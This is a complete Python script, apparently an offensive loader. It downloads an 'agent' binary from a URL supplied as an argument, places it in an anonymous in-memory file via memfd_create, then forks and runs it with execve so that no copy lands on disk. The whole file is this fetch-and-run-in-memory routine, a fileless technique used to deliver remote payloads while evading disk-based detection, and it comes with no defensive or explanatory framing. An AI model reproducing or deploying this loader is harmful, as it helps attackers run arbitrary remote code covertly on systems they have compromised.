import os, sys, requests

args = []

def main(url: str):
    # Requesting the agent bytes from the server
    reqAgent = requests.get(url)

    if reqAgent.status_code != 200:
        print(f"[ERROR] - Error while requesting the server: {reqAgent.status_code}")
        return

    # Creating file in memory
    fd = os.memfd_create("1", 0)

    # Writing the agent content to the file descriptor
    with open(f"/proc/self/fd/{fd}", "wb") as f:
        f.write(reqAgent.content)

    # Executing the file using execve
    print("[INFO] - Executing agent in memory")
    childPID = os.fork()

    if childPID == -1:
        print("[ERROR] - Could not initiate agent in memory")
        exit()

    elif childPID == 0:
        filePath = f"/proc/self/fd/{fd}"
        args.insert(0, filePath)

        os.execve(filePath, args, dict(os.environ))

if __name__ == "__main__":
    main(sys.argv[1])
